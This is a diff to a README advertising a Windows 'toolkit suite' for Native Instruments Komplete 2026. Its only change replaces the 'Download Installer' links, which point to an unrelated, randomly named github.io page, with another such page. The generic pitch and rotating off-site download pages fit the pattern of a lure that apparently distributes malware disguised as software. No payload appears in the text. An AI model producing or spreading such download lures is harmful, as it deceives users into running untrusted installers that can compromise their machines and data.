@@ -2,7 +2,7 @@
 
 Native Instruments Komplete 2026 is a leading music production platform, and this toolkit suite is designed to help you manage, optimize, and get the most out of your Komplete libraries and plugins on Windows. Whether you're a producer, sound designer, or hobbyist, this tool simplifies the process of organizing your assets, ensuring smooth performance, and expanding your creative possibilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside – Key Features
 
@@ -58,7 +58,7 @@ This toolkit was last updated in January 2026, incorporating the latest features
 
 To get the latest version, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Contributing and Support
 
